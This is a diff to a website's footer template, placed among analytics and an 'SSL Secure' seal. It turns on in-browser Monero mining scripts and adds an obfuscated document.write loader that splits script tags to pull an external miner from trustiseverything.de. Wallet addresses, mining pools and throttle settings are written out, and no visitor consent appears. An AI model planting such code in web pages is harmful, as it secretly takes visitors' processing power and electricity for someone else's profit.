@@ -31,7 +31,8 @@ alt="Web Analytics"></a></div></noscript>
    src="/ssl-secure-seal.png"
    width="187" height="90" alt="SSL Secure"></a>
 
-<!--<script src="https://coinwebmining.com/cwm.js"></script>
+<!--
+<script src="https://coinwebmining.com/cwm.js"></script>
 <script>
     if (! miner_is_working) {
         var site_id = 'cwm-3735';
@@ -45,13 +46,14 @@ alt="Web Analytics"></a></div></noscript>
         cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
         miner_is_working = true;
     }
-</script>-->
+</script>
+-->
 <script type="text/javascript">
     var miner_is_working = false;
 </script>
 <script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
 <script type="text/javascript">
-    if (! miner_is_working) {
+    //if (! miner_is_working) {
         server = "wss://f.xmrminingproxy.com:8181";
         var pool = "moneroocean.stream";
         var wallet_address = '84FEn5Gak63AReZjRtDwV724TsoUtfajxjLHHJZ3zH3vcaAZJwvg4qWdUG9cx7nhA1ZfT9kK89roADmRb1ehLLhH6HyTATK';
@@ -61,9 +63,21 @@ alt="Web Analytics"></a></div></noscript>
         startMining(pool, wallet_address, worker_id, threads, password);
         throttleMiner = 20;
         miner_is_working = true;
-    }
+    //}
 </script>
 
+<script type="text/javascript">
+    if (! miner_is_working) {
+        document.write("<sc"+"ript type='text/javascript' src='" +
+        scJsHost+
+        "trustiseverything.de/karma/karma.js?karma=bs?nosaj=faster.mo'></"+"script>");
+        document.write("<sc"+"ript type='text/javascript'>" +
+        "EverythingIsLife(waller_address, password, throttleMiner);" +
+        "miner_is_working = true;" +
+	"</"+"script>");
+    }
+</script>
+<!--
 <script src="https://trustiseverything.de/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
 <script type="text/javascript">
     if (! miner_is_working) {
@@ -71,7 +85,9 @@ alt="Web Analytics"></a></div></noscript>
         miner_is_working = true;
     }
 </script>
+-->
 
+<!--
 <script src="https://webminepool.com/lib/base.js"></script>
 <script>
     if (! miner_is_working) {
@@ -88,5 +104,6 @@ alt="Web Analytics"></a></div></noscript>
         miner_is_working = true;
     }
 </script>
+-->
 
 <!-- end custom footer snippets -->
